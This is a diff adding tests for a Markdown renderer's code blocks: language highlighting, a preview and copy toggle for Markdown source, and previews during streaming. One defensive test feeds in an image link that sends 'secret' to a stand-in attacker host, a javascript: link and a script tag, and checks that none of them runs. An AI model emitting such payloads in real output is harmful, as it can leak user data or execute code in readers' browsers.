@@ -88,6 +88,20 @@ describe("a code block", () => {
     expect(box.querySelector("button")?.textContent).toBe("Copied");
   });
 
+  it("is coloured by the language it names, without losing a character", () => {
+    const code = 'def total(items):\n    return sum(items)  # "all"\n';
+    const box = rendered(`\`\`\`python\n${code}\`\`\``);
+    expect(box.querySelector("pre .hljs-keyword")?.textContent).toBe("def");
+    expect(box.querySelector("pre")?.textContent).toBe(code);
+    expect(box.querySelector(".code-block-header span")?.textContent).toBe("python");
+  });
+
+  it.each(["", "mermaid"])("is left plain when its language is %o", (language) => {
+    const box = rendered(`\`\`\`${language}\ndef x\n\`\`\``);
+    expect(box.querySelector("pre [class^='hljs-']")).toBeNull();
+    expect(box.querySelector("pre")?.textContent).toBe("def x\n");
+  });
+
   it("stays usable when the browser refuses the clipboard", async () => {
     const user = userEvent.setup();
     const write = vi.spyOn(navigator.clipboard, "writeText").mockRejectedValue(new Error("denied"));
@@ -95,5 +109,38 @@ describe("a code block", () => {
     await user.click(box.querySelector("button")!);
     expect(write).toHaveBeenCalledOnce();
     expect(box.querySelector("button")?.textContent).toBe("Copy");
+  });
+});
+
+describe("a block of Markdown source", () => {
+  const fenced = "```markdown\n# Brief\n\n| Role | Team |\n| --- | --- |\n| **Staff** | Engineering |\n```";
+
+  it("shows what it will look like, with the source and a copy of it one click away", async () => {
+    const user = userEvent.setup();
+    const box = rendered(fenced);
+    expect(box.querySelector("h1")?.textContent).toBe("Brief");
+    expect(box.querySelector("table strong")?.textContent).toBe("Staff");
+    expect(box.querySelector("pre")).toBeNull();
+
+    const [toggle, copy] = [...box.querySelectorAll("button")];
+    await user.click(copy!);
+    expect(await navigator.clipboard.readText()).toContain("| **Staff** | Engineering |");
+    await user.click(toggle!);
+    expect(box.querySelector("table")).toBeNull();
+    expect(box.querySelector("pre")?.textContent).toContain("# Brief");
+    expect(toggle!.textContent).toBe("Preview");
+  });
+
+  it("neither runs HTML nor fetches anything inside the preview", () => {
+    // The script on a line of its own: in front of other text it would make the whole line one HTML block.
+    const box = rendered("```md\n![leak](https://attacker.example/?d=secret) [x](javascript:alert(1))\n\n<script>alert(1)</script>\n```");
+    expect(box.querySelector("img, script")).toBeNull();
+    expect([...box.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toEqual(["https://attacker.example/?d=secret"]);
+  });
+
+  it("is previewed while it is still arriving", () => {
+    const box = arriving("```markdown\n## Team\n\n- **Priya");
+    expect(box.querySelector("h2")?.textContent).toBe("Team");
+    expect(box.querySelector("li strong")?.textContent).toBe("Priya");
   });
 });
